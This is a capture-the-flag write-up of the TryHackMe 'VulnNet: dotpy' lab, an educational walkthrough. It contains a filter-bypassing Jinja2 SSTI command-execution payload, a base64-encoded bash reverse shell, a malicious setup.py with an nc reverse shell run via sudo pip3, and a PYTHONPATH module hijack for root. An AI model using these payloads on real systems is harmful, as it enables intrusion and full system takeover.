---
title: "TryHackMe - VulnNet: dotpy"
author: Nasrallah
description: ""
date: 2023-03-01 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, medium, python, ssti, hijacking]
img_path: /assets/img/tryhackme/dotpy
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [VulnNet: dotpy](https://tryhackme.com/room/) from [TryHackMe](https://tryhackme.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.52.235
Host is up (0.099s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
| http-title: VulnNet Entertainment -  Login  | Discover
|_Requested resource was http://10.10.52.235:8080/login
```

There is only one ports open which is 8080 and it's running Wekzeug http web server that uses python 3.6.9

## Web

Let's navigate to the web page.

![](1.png)

We see a login page, i tried some default credentials but no luck with that.

Next i registered an account and logged in.

![](2.png)

Most links on this dashboard don't work.

Next is to see what's going to happen if we request a non existing page.

![](3.png)

We got an 404 page and the name of the page we requested gets returned.

Since the server is using python, one of the first things we should test for is Server Side Template injection(SSTI).

![](4.png)

Using the payload `{{7*7}}`, we managed to confirm that the website is vulnerable to SSTI

# **Foothold**

Now let's try command injection. Thanks to [PayloadsAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution), we can find multiple payloads for command execution.

![](5.png)

Tried multiple payloads but always our request seems to get blocked, this means that there is filter that we need to bypass.

On the same section on `PayloadAllThings` we can find a payload that bypasses multiple filters

```python
\{\{request\|attr('application')\|attr('\x5f\x5fglobals\x5f\x5f')\|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')\|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')\|attr('read')() \}\}
```

Using burp suite, let's see if the above payload allows us to execute commands.

![](6.png)

Great! We command execution, now let's get a reverse shell.

The payload we'll use for a reverse shell is the following.

```bash
sh -i >& /dev/tcp/10.10.10.10/9001 0>&1
```

But to get it passed the filter, we'll base64 encode it.

```base64
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvOTAwMSAwPiYxCg==
```

To get this executed on the target system, we need to decode it and pipe it to bash just like the following

```bash
echo${IFS}c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvOTAwMSAwPiYxCg==|base64${IFS}-d|bash
```

>The ${IFS} is used to replace space.

Now we setup a listener and send our payload.

![](7.png)

# **Privilege Escalation**

## system-adm

Let's check out current privileges as use `web`

```terminal
web@vulnnet-dotpy:~$ sudo -l
Matching Defaults entries for web on vulnnet-dotpy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User web may run the following commands on vulnnet-dotpy:
    (system-adm) NOPASSWD: /usr/bin/pip3 install *
```

We can install any python package as user `system-adm`.

To exploit that, let's create a directory that's gonna have a malicious setup.py file.

On the setup.py, we'll import os and use it execute a reverse shell.

```python
import os
os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.14.124 1337 >/tmp/f")
```

Next we run the following command that's gonna run the setup.py file.

```bash
sudo -u system-adm /usr/bin/pip3 install . --upgrade --force-reinstall
```

![](8.png)

## root

Let'a again check our privileges as the `system-adm`.

```terminal
system-adm@vulnnet-dotpy:~$ sudo -l
Matching Defaults entries for system-adm on vulnnet-dotpy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User system-adm may run the following commands on vulnnet-dotpy:
    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
```

We can run `backup.py` as root and we also see `SETENV` option that allows to set environment variable for `backup.py`.

Checking `backup.py` we see that it imports `zipfile`. We can exploit that by creating a `zipfile.py` of our own that executes bash and give us a root shell.

```python
import os; os.system("/bin/bash")
```

We put the file in `/tmp` directory and and run the sudo command with setting the PYTHONPATH environment variable to `/tmp`.

```bash
sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/backup.py
```

![](9.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---
